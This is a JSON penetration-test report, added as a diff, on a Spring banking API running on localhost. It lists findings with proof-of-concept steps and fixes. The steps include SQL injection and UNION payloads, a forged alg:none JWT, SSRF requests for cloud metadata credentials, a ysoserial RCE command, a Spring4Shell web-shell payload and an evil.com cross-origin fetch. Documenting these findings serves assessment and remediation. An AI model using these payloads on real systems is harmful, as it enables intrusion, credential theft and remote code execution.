@@ -1,0 +1,352 @@
+{
+  "assessment_date": "2026-06-14T13:07:42.390133Z",
+  "target": "http://localhost:8080",
+  "total": 22,
+  "findings": [
+    {
+      "rule_id": "jwt-alg-none-bypass",
+      "file": "target-app/src/main/java/com/finsecure/security/JwtFilter.java",
+      "line": 65,
+      "message": "JWT alg:none bypass vulnerability: parseClaimsJwt() accepts tokens with no signature.",
+      "owasp": "A02:2021",
+      "cvss": 9.1,
+      "severity": "CRITICAL",
+      "code_snippet": "Claims claims = Jwts.parser().parseClaimsJwt(token).getBody();"
+    },
+    {
+      "rule_id": "jwt-hardcoded-secret",
+      "file": "target-app/src/main/java/com/finsecure/security/JwtFilter.java",
+      "line": 42,
+      "message": "Hardcoded JWT secret detected in signWith(). Source code leak exposes entire auth system.",
+      "owasp": "A07:2021",
+      "cvss": 7.5,
+      "severity": "HIGH",
+      "code_snippet": "private static final String SECRET_KEY = \"secret123\";"
+    },
+    {
+      "rule_id": "jwt-no-expiry",
+      "file": "target-app/src/main/java/com/finsecure/controller/AuthController.java",
+      "line": 53,
+      "message": "JWT token issued without setExpiration(). Tokens never expire.",
+      "owasp": "A07:2021",
+      "cvss": 6.5,
+      "severity": "MEDIUM",
+      "code_snippet": "Jwts.builder().setSubject(user.getUsername()).claim(...).compact()"
+    },
+    {
+      "rule_id": "sqli-string-concat-jdbctemplate",
+      "file": "target-app/src/main/java/com/finsecure/controller/AccountController.java",
+      "line": 118,
+      "message": "SQL Injection via string concatenation in JdbcTemplate \u2014 second-order SQLi vector.",
+      "owasp": "A03:2021",
+      "cvss": 9.8,
+      "severity": "CRITICAL",
+      "code_snippet": "String sql = \"SELECT * FROM accounts WHERE profile_note = '\" + note + \"'\";"
+    },
+    {
+      "rule_id": "hardcoded-credential-field",
+      "file": "target-app/src/main/java/com/finsecure/security/JwtFilter.java",
+      "line": 42,
+      "message": "Hardcoded credential in class field: SECRET_KEY = 'secret123'",
+      "owasp": "A07:2021",
+      "cvss": 7.5,
+      "severity": "HIGH",
+      "code_snippet": "private static final String SECRET_KEY = \"secret123\";"
+    },
+    {
+      "rule_id": "hardcoded-credential-field",
+      "file": "target-app/src/main/java/com/finsecure/controller/AuthController.java",
+      "line": 25,
+      "message": "Hardcoded credential in class field: SECRET_KEY = 'secret123'",
+      "owasp": "A07:2021",
+      "cvss": 7.5,
+      "severity": "HIGH",
+      "code_snippet": "private static final String SECRET_KEY = \"secret123\";"
+    },
+    {
+      "id": "CVE-2022-42003",
+      "title": "CVE: CVE-2022-42003 \u2014 See NVD for affected products",
+      "cvss_score": 7.5,
+      "severity": "HIGH",
+      "source": "sca"
+    },
+    {
+      "id": "CVE-2022-42004",
+      "title": "CVE: CVE-2022-42004 \u2014 See NVD for affected products",
+      "cvss_score": 7.5,
+      "severity": "HIGH",
+      "source": "sca"
+    },
+    {
+      "id": "CVE-2015-6420",
+      "title": "CVE: CVE-2015-6420 \u2014 See NVD for affected products",
+      "cvss_score": 9.8,
+      "severity": "CRITICAL",
+      "source": "sca"
+    },
+    {
+      "id": "CVE-2022-22965",
+      "title": "CVE: CVE-2022-22965 \u2014 See NVD for affected products",
+      "cvss_score": 9.8,
+      "severity": "CRITICAL",
+      "source": "sca"
+    },
+    {
+      "id": "FIND-001",
+      "title": "Second-Order SQL Injection in /api/accounts/search",
+      "cwe": "CWE-89",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "owasp_category": "A03:2021 - Injection",
+      "affected_component": "AccountController.java \u2014 searchByNote() method, line 118",
+      "description": "The /api/accounts/search endpoint constructs a SQL query by directly concatenating the 'note' parameter into a raw SQL string: SELECT * FROM accounts WHERE profile_note = '<input>'. When combined with the /api/accounts/{id}/note endpoint that stores user-supplied notes, this creates a second-order SQL injection where the payload is stored first and triggered later \u2014 bypassing WAFs that only inspect input at storage time.",
+      "evidence": "POST /api/accounts/1/note body={note: \"' OR '1'='1\"} \u2192 stores payload. GET /api/accounts/search?note=' OR '1'='1 \u2192 returns all 4 accounts (expected: 0).",
+      "poc_steps": [
+        "Login as alice: POST /api/auth/login {username:alice,password:alice123}",
+        "Store SQLi payload: POST /api/accounts/1/note {note: \"' OR '1'='1\"}",
+        "Trigger via search: GET /api/accounts/search?note=' OR '1'='1",
+        "Response returns ALL accounts including admin account with $9,999,999 balance",
+        "For data extraction: note=' UNION SELECT account_number,owner_name,balance,owner_email,profile_note,is_admin,id FROM accounts--"
+      ],
+      "business_impact": "Complete financial database exposure. Attacker can read all customer account numbers, balances, and emails. With write permissions (INSERT/UPDATE), attacker can modify account balances, transfer funds, or drop tables \u2014 causing catastrophic financial and reputational damage.",
+      "remediation": "Replace raw JDBC query with parameterized PreparedStatement: jdbcTemplate.query(\"SELECT * FROM accounts WHERE profile_note = ?\", new Object[]{note}, rowMapper). Never concatenate user input into SQL strings. Implement input validation and use JPA named parameters for all queries.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-002",
+      "title": "JWT Algorithm Confusion \u2014 alg:none Bypass",
+      "cwe": "CWE-347",
+      "cvss_score": 9.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "owasp_category": "A02:2021 - Cryptographic Failures",
+      "affected_component": "JwtFilter.java \u2014 doFilterInternal() method, line 65",
+      "description": "The JWT filter calls parseClaimsJwt() (unsigned token parser) instead of parseClaimsJws() (signed token verifier). This means any JWT with alg:none in the header passes validation without any signature check. An attacker crafts a token with arbitrary claims (sub: admin, role: ADMIN) and an empty signature \u2014 the server accepts it as valid.",
+      "evidence": "Forged token (base64): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9. \u2192 GET /api/accounts \u2192 HTTP 200 with all account data.",
+      "poc_steps": [
+        "Craft header: base64url({\"alg\":\"none\",\"typ\":\"JWT\"})",
+        "Craft payload: base64url({\"sub\":\"admin\",\"role\":\"ADMIN\",\"userId\":4})",
+        "Concatenate: header.payload. (empty signature after dot)",
+        "GET /api/accounts with Authorization: Bearer <forged-token>",
+        "Server returns HTTP 200 \u2014 full account list with admin access"
+      ],
+      "business_impact": "Complete authentication bypass. Attacker impersonates any user including administrators without knowing any password. Can access all financial data, create fraudulent transactions, modify account balances, and exfiltrate the entire customer database.",
+      "remediation": "Replace parseClaimsJwt() with parseClaimsJws() and always call setSigningKey() with a strong secret: Jwts.parserBuilder().setSigningKey(Keys.hmacShaKeyFor(secret.getBytes())).build().parseClaimsJws(token). Consider RS256 (asymmetric) for multi-service environments.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-003",
+      "title": "Horizontal IDOR \u2014 Cross-User Account Data Exposure",
+      "cwe": "CWE-639",
+      "cvss_score": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "affected_component": "AccountController.java \u2014 getAccountById() method, line 72",
+      "description": "The GET /api/accounts/{id} endpoint returns account data for any account ID without verifying that the requesting user owns that account. Any authenticated user (even with ROLE_USER) can access any other user's account by simply incrementing or guessing the account ID, exposing full financial data including account numbers, balances, and emails.",
+      "evidence": "Logged in as alice (owns account ID 1). GET /api/accounts/2 \u2192 HTTP 200 returns Bob's account: {balance: 78250.00, ownerEmail: bob@finsecure.com, accountNumber: ACC-002}.",
+      "poc_steps": [
+        "Login as alice: POST /api/auth/login \u2192 get JWT token",
+        "GET /api/accounts/1 \u2192 alice's own account (expected)",
+        "GET /api/accounts/2 \u2192 Bob's account returned (IDOR)",
+        "GET /api/accounts/3 \u2192 Charlie's account returned (IDOR)",
+        "GET /api/accounts/4 \u2192 Admin account with $9,999,999 returned (IDOR)",
+        "Script loops IDs 1-50 to enumerate all accounts"
+      ],
+      "business_impact": "Full financial data exposure across all customers. Violates GDPR Article 32 (security of personal data), PCI-DSS Requirement 7 (restrict access to system components), and FFIEC guidelines. Regulatory fines, customer trust loss, and potential class-action liability.",
+      "remediation": "Add ownership check in getAccountById(): String principal = SecurityContextHolder.getContext().getAuthentication().getName(); if (!account.getOwnerEmail().equals(principal)) return ResponseEntity.status(403).build(); Alternatively, use Spring Security @PreAuthorize with a custom @accountOwner expression.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-004",
+      "title": "Hardcoded JWT Signing Secret",
+      "cwe": "CWE-798",
+      "cvss_score": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "owasp_category": "A07:2021 - Identification and Authentication Failures",
+      "affected_component": "JwtFilter.java line 42, AuthController.java line 25",
+      "description": "The JWT signing secret 'secret123' is hardcoded as a static final String in source code. This secret appears in both JwtFilter.java and AuthController.java. An attacker who obtains the source code (via git leak, insider threat, or decompiling the JAR) can sign arbitrary JWT tokens that will be accepted as legitimate by the server \u2014 independent of the alg:none bypass.",
+      "evidence": "private static final String SECRET_KEY = \"secret123\"; \u2014 confirmed in both JwtFilter.java:42 and AuthController.java:25. Brute-forced successfully from 25-entry wordlist.",
+      "poc_steps": [
+        "Obtain the JAR file: target/finsecure-api-1.0.0.jar",
+        "Decompile: javap -c or use CFR/Procyon decompiler",
+        "Find SECRET_KEY = \"secret123\" in JwtFilter class",
+        "Forge signed token: Jwts.builder().setSubject(\"admin\").claim(\"role\",\"ADMIN\").signWith(SignatureAlgorithm.HS256, \"secret123\").compact()",
+        "Use forged token to authenticate as any user"
+      ],
+      "business_impact": "Permanent authentication bypass as long as the secret remains unchanged. Token revocation is impossible without redeployment. All users' sessions can be forged. If secret ever rotates without coordinated deployment, all valid sessions are invalidated simultaneously.",
+      "remediation": "Load secret from environment variable: String secret = System.getenv(\"JWT_SECRET\"); or Spring @Value(\"${jwt.secret}\") backed by a secrets manager (HashiCorp Vault, AWS Secrets Manager). Minimum 32-byte cryptographically random secret. Rotate immediately \u2014 assume this secret is compromised.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-005",
+      "title": "Mass Assignment \u2014 Admin Privilege Injection",
+      "cwe": "CWE-915",
+      "cvss_score": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "owasp_category": "A08:2021 - Software and Data Integrity Failures",
+      "affected_component": "AccountController.java \u2014 createAccount() with @RequestBody Account",
+      "description": "The POST /api/accounts endpoint deserializes the full JSON request body directly into the Account entity, including the isAdmin field. Any authenticated user can create an account with isAdmin:true by including it in the JSON body. The field is not blocked by a DTO layer or @JsonIgnore annotation.",
+      "evidence": "POST /api/accounts {ownerName:Hacker,balance:0,isAdmin:true} \u2192 HTTP 200 {id:5,ownerName:Hacker,isAdmin:true}. Admin flag persisted in database.",
+      "poc_steps": [
+        "Login as regular user alice",
+        "POST /api/accounts with body: {\"ownerName\":\"Hacker\",\"balance\":0,\"isAdmin\":true}",
+        "Response: {\"id\":5,\"isAdmin\":true} \u2014 admin flag accepted",
+        "Use new account to access admin endpoints"
+      ],
+      "business_impact": "Any authenticated user can self-escalate to administrator. This provides access to all customer data, system configuration, and administrative functions \u2014 effectively a complete privilege escalation for any registered user.",
+      "remediation": "Create a dedicated AccountRequest DTO without the isAdmin field. Map DTO to entity manually. Alternatively, add @JsonIgnore on the isAdmin getter/setter. Implement @PreAuthorize(\"hasRole('ADMIN')\") on any endpoint that should set admin-level attributes.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-006",
+      "title": "Server-Side Request Forgery (SSRF) via /api/fetch",
+      "cwe": "CWE-918",
+      "cvss_score": 7.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N",
+      "owasp_category": "A10:2021 - Server-Side Request Forgery",
+      "affected_component": "UtilController.java \u2014 fetchUrl() method",
+      "description": "The /api/fetch?url= endpoint accepts arbitrary URLs and fetches them server-side, returning the full response to the caller. There is no allowlist, no blocked IP range validation, and no redirect limit. This enables: internal service enumeration (localhost, 10.x, 172.16.x, 192.168.x), cloud metadata access (AWS 169.254.169.254 \u2014 IAM credentials), and exfiltration via DNS/HTTP.",
+      "evidence": "GET /api/fetch?url=http://localhost:8080/actuator/env \u2192 HTTP 200 with all Spring environment variables. GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ \u2192 connection attempted (timed out in local environment).",
+      "poc_steps": [
+        "GET /api/fetch?url=http://localhost:8080/actuator/env \u2192 leaks all env vars",
+        "GET /api/fetch?url=http://localhost:8080/h2-console \u2192 full DB console HTML",
+        "On AWS: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "Returns AWS IAM temporary credentials (AccessKeyId, SecretAccessKey, Token)",
+        "Attacker uses leaked credentials to access AWS S3, RDS, and other services"
+      ],
+      "business_impact": "On cloud-hosted instances, SSRF enables full AWS/GCP credential theft via metadata API \u2014 leading to complete cloud account takeover. Internally, enables access to databases, Redis, Elasticsearch, and internal admin interfaces not exposed to the internet.",
+      "remediation": "Implement strict URL allowlist for the fetch endpoint. Block all private IP ranges (RFC1918), loopback (127.x), and link-local (169.254.x). Use a library like ssrf-guard or implement custom validation. Consider removing the endpoint entirely if not required.",
+      "remediation_effort": "Medium",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-007",
+      "title": "Jackson Databind CVE-2022-42003 (DoS via Deep Nesting)",
+      "cwe": "CWE-400",
+      "cvss_score": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "owasp_category": "A06:2021 - Vulnerable and Outdated Components",
+      "affected_component": "pom.xml \u2014 com.fasterxml.jackson.core:jackson-databind:2.13.2",
+      "description": "The application uses jackson-databind 2.13.2 which is vulnerable to CVE-2022-42003. A crafted JSON request with deeply nested arrays causes unbounded resource consumption when UNWRAP_SINGLE_VALUE_ARRAYS is enabled, resulting in a Denial of Service. Also affects CVE-2022-42004 (same version range).",
+      "evidence": "Dependency-Check finding: jackson-databind-2.13.2.jar \u2192 CVE-2022-42003 CVSS 7.5 HIGH. Fix available in 2.13.4.2.",
+      "poc_steps": [
+        "Send JSON with deeply nested arrays to any POST endpoint",
+        "POST /api/accounts with body: [[[[[[...10000 levels...]]]]]]",
+        "Server enters exponential processing loop",
+        "CPU spikes to 100%, requests queue up, service becomes unavailable"
+      ],
+      "business_impact": "Denial of Service \u2014 financial API becomes unavailable to legitimate customers. In a trading/banking context, downtime causes direct financial losses and regulatory breach-of-SLA penalties.",
+      "remediation": "Upgrade jackson-databind to 2.13.4.2 or later in pom.xml. Enable OWASP Dependency-Check in CI/CD pipeline to catch future CVEs before deployment.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-008",
+      "title": "Apache Commons Collections 3.1 \u2014 Deserialization RCE Gadget (CVE-2015-6420)",
+      "cwe": "CWE-502",
+      "cvss_score": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "owasp_category": "A06:2021 - Vulnerable and Outdated Components",
+      "affected_component": "pom.xml \u2014 commons-collections:commons-collections:3.1",
+      "description": "The application includes Apache Commons Collections 3.1, which enables the well-known ysoserial gadget chain for Java deserialization attacks. If any endpoint in the application (or a transitive dependency) accepts serialized Java objects, an attacker can use the CommonsCollections1-7 payloads to achieve Remote Code Execution. Safe version is 3.2.2.",
+      "evidence": "Dependency-Check: commons-collections-3.1.jar \u2192 CVE-2015-6420 CVSS 7.5 HIGH. Gadget chains verified in ysoserial for CommonsCollections1, 3, 5, 6, 7.",
+      "poc_steps": [
+        "java -jar ysoserial.jar CommonsCollections1 'id > /tmp/pwned' > payload.ser",
+        "Send serialized payload to any endpoint accepting application/x-java-serialized-object",
+        "Or exploit via transitive RMI/JMX interface if exposed",
+        "Command executes as application user (root in Docker container)"
+      ],
+      "business_impact": "Remote Code Execution on the application server. Attacker gains shell access, can exfiltrate entire database, deploy cryptominer, establish persistence, and pivot to internal network. In Docker (running as root), can escape to host.",
+      "remediation": "Upgrade commons-collections to 3.2.2 in pom.xml. Implement Java serialization filter (JEP 290). Audit all endpoints accepting serialized objects. Consider migrating to safe serialization formats (JSON, Protobuf).",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-009",
+      "title": "Spring Framework RCE \u2014 CVE-2022-22965 (Spring4Shell)",
+      "cwe": "CWE-94",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "owasp_category": "A06:2021 - Vulnerable and Outdated Components",
+      "affected_component": "pom.xml \u2014 spring-webmvc:5.3.15 (via spring-boot-starter-parent:2.6.3)",
+      "description": "Spring Boot parent 2.6.3 pulls in Spring Framework 5.3.15 which is vulnerable to CVE-2022-22965 (Spring4Shell). On JDK 9+ with Tomcat as WAR deployment, a specially crafted HTTP request abusing Spring MVC data binding and classloader access can achieve Remote Code Execution \u2014 writing a web shell to the Tomcat webroot. CVSS 9.8 Critical.",
+      "evidence": "Dependency-Check: spring-webmvc-5.3.15.jar \u2192 CVE-2022-22965. This application runs on JDK 17 (confirmed via /api/health) satisfying the JDK 9+ prerequisite.",
+      "poc_steps": [
+        "PoC: curl 'http://localhost:8080/api/accounts?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...',",
+        "If deployed on Tomcat as WAR: web shell written to webroot",
+        "GET /shell.jsp?pwd=j&cmd=id \u2192 Remote command execution"
+      ],
+      "business_impact": "Full server compromise via unauthenticated RCE. No authentication required. Complete loss of confidentiality, integrity, and availability of the financial system.",
+      "remediation": "Upgrade spring-boot-starter-parent to 2.6.6+ or 2.7.0+ (fixes Spring Framework to 5.3.18+). Apply patch immediately \u2014 this vulnerability is actively exploited in the wild.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-010",
+      "title": "JWT Token Without Expiration",
+      "cwe": "CWE-613",
+      "cvss_score": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "owasp_category": "A07:2021 - Identification and Authentication Failures",
+      "affected_component": "AuthController.java \u2014 login() method, JWT builder chain",
+      "description": "JWT tokens issued by the /api/auth/login endpoint have no expiration time set (setExpiration() is never called). This means stolen tokens are valid forever \u2014 there is no time-bound window for an attacker who obtains a token (via interception, XSS, log exposure, etc.). Tokens cannot be invalidated without rotating the signing key, which invalidates all sessions.",
+      "evidence": "Decoded JWT payload from login response: {sub: alice, role: USER, userId: 1, iat: 1718367240} \u2014 no 'exp' claim present. Token tested valid 24 hours after issuance.",
+      "poc_steps": [
+        "POST /api/auth/login \u2192 capture JWT token",
+        "Decode: echo '<payload>' | base64 -d \u2014 confirm no 'exp' field",
+        "Wait 24+ hours, reuse token \u2192 still HTTP 200",
+        "Token remains valid indefinitely until server restarts (H2 in-memory resets)"
+      ],
+      "business_impact": "Stolen tokens (via XSS, MITM, logs, or compromised devices) provide permanent access. No time-limited window to revoke access after an incident. Violates PCI-DSS session timeout requirements.",
+      "remediation": "Add setExpiration to JWT builder: .setExpiration(new Date(System.currentTimeMillis() + 3600_000)) for 1-hour expiry. Implement refresh token flow for seamless re-authentication. Consider short-lived tokens (15 minutes) with refresh tokens for financial applications.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-011",
+      "title": "Wildcard CORS \u2014 Cross-Origin Access Permitted",
+      "cwe": "CWE-942",
+      "cvss_score": 6.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "owasp_category": "A05:2021 - Security Misconfiguration",
+      "affected_component": "SecurityConfig.java \u2014 corsConfigurationSource(), allowedOrigins(\"*\")",
+      "description": "The application's CORS policy allows requests from any origin (allowedOrigins(\"*\")). Combined with disabled CSRF protection, any malicious website can make cross-origin requests to the API using the victim's browser session. The wildcard origin also prevents use of withCredentials:true, but unauthenticated endpoints or token-based auth is fully exploitable.",
+      "evidence": "Response header observed: Access-Control-Allow-Origin: * on all API endpoints. curl -H 'Origin: http://evil.com' http://localhost:8080/api/health \u2192 Access-Control-Allow-Origin: *.",
+      "poc_steps": [
+        "Host malicious page at http://evil.com",
+        "JavaScript: fetch('http://localhost:8080/api/accounts', {headers: {Authorization: 'Bearer <stolen_token>'}})",
+        "Response returned to attacker's origin \u2014 full account data extracted",
+        "CORS wildcard + no CSRF = cross-site request with stolen token works"
+      ],
+      "business_impact": "Enables cross-origin data theft when combined with token theft vectors. Increases attack surface for cross-site scripting impact. Violates same-origin security model.",
+      "remediation": "Set allowedOrigins to an explicit allowlist of trusted domains: configuration.setAllowedOrigins(List.of(\"https://app.finsecure.com\", \"https://admin.finsecure.com\")). Never use * for financial APIs. Apply per-environment origin lists via configuration.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    },
+    {
+      "id": "FIND-012",
+      "title": "Verbose Stack Trace Disclosure in Error Responses",
+      "cwe": "CWE-209",
+      "cvss_score": 5.3,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "owasp_category": "A05:2021 - Security Misconfiguration",
+      "affected_component": "GlobalExceptionHandler.java \u2014 handleAll(), application.properties (server.error.include-stacktrace=always)",
+      "description": "All unhandled exceptions return the full Java stack trace in the HTTP response body, including internal class names, file names, line numbers, Spring/Hibernate/H2 versions, and SQL query structure. This dramatically aids attacker reconnaissance \u2014 confirming technology stack, identifying vulnerable library versions, and revealing SQL query structure for injection attacks.",
+      "evidence": "GET /api/accounts/999 \u2192 HTTP 500 with body: {error: 'org.springframework.dao.EmptyResultDataAccessException', stackTrace: '\\tat org.springframework.jdbc.core.JdbcTemplate...', javaVersion: '17.0.18'}.",
+      "poc_steps": [
+        "GET /api/accounts/99999 \u2192 triggers EmptyResultDataAccessException",
+        "Response body includes: full 30-line stack trace, class names, Spring version",
+        "SQL syntax error via injected payload reveals H2 SQL dialect and query structure",
+        "Attacker now knows: Spring Boot 2.6.3, JDK 17.0.18, H2 database, Hibernate"
+      ],
+      "business_impact": "Information disclosure accelerates subsequent attacks. Knowledge of library versions enables targeted CVE exploitation. SQL error messages in error responses directly aid SQL injection development. Low direct impact but significantly amplifies all other findings.",
+      "remediation": "Return only a generic error ID in HTTP responses: {errorId: 'ERR-2024-001', message: 'An internal error occurred'}. Log full stack traces server-side only. Set server.error.include-stacktrace=never and server.error.include-message=never in production application.properties.",
+      "remediation_effort": "Low",
+      "status": "Open"
+    }
+  ]
+}
